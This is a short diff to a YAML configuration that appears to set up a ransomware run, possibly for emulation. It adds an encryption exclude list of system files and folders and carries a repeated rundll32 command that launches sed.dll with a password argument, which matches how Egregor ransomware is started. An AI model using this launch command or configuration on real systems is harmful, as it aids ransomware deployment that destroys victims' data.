@@ -1,4 +1,11 @@
 file_extension: <random.4.7>
+exclude:
+  - .exe
+  - .dll
+  - .lnk
+  - .sys
+  - %SYSTEMDRIVE%\Windows
+  - %SYSTEMDRIVE%\ProgramData
 command:
   - rundll32.exe C:\\Windows\\sed.dll,DllRegisterServer -passegregor1313 --full
   - rundll32.exe C:\\Windows\\sed.dll,DllRegisterServer -passegregor1313 --full
